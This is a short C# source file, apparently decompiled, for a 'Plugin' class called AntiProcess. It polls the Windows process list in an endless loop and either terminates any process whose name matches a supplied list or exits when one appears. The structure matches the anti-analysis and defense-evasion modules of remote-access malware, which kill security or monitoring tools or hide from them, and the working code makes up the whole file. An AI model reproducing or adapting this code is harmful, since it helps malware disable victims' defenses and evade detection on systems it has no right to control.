using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Plugin;

public static class AntiProcess
{
	public static void Block(bool kord, object[] processes)
	{
		while (true)
		{
			IntPtr intPtr = CreateToolhelp32Snapshot(2u, 0u);
			PROCESSENTRY32 lppe = default(PROCESSENTRY32);
			lppe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
			if (Process32First(intPtr, ref lppe))
			{
				do
				{
					uint th32ProcessID = lppe.th32ProcessID;
					string szExeFile = lppe.szExeFile;
					foreach (object obj in processes)
					{
						if (Matches(szExeFile, (string)obj))
						{
							if (kord)
							{
								KillProcess(th32ProcessID);
							}
							else
							{
								Environment.Exit(0);
							}
						}
					}
				}
				while (Process32Next(intPtr, ref lppe));
			}
			CloseHandle(intPtr);
			Thread.Sleep(200);
		}
	}

	private static bool Matches(string source, string target)
	{
		return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
	}

	private static void KillProcess(uint processId)
	{
		IntPtr intPtr = OpenProcess(1u, bInheritHandle: false, processId);
		TerminateProcess(intPtr, 0);
		CloseHandle(intPtr);
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

	[DllImport("kernel32.dll")]
	private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

	[DllImport("kernel32.dll")]
	private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(IntPtr handle);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);
}
